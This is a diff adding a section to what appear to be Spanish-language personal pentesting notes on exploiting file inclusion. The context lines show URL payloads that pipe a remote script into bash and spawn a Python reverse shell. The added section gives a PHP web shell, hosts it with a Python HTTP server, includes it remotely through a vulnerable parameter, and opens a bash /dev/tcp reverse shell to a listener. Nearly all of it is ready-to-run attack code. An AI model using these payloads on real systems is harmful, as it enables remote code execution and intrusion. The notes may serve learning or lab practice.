@@ -49,3 +49,36 @@ URL = http://<IP>/index.php?cmd=curl http://<IP_HOST>/ | bash&PAYLOAD=<CONTENT_G
 ```bash
 URL = http://<IP>/?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'&page=<CONTENT_GENERATE>
 ```
+## Sin PHP Filter
+
+cmd.php
+
+```php
+<?php
+  system($_GET["cmd"]);
+?>
+```
+
+Donde tengo el archivo despliego un servidor http con Python:
+
+```bash
+python3 -m http.server 80
+```
+
+Y ejecuto en el navegador:
+
+```bash
+URL/archivo.php?<PARAMETRO>=http://172.17.0.1/cmd.php&cmd=id
+```
+
+Si funciona entonces me mandare una rev shell antes poniéndome en escucha:
+
+```bash
+nc -lnvp 4444
+```
+
+Y ejecuto:
+
+```bash
+URL/archivo.php?<PARAMETRO>=http://172.17.0.1/cmd.php&cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/4444 <%261'
+```
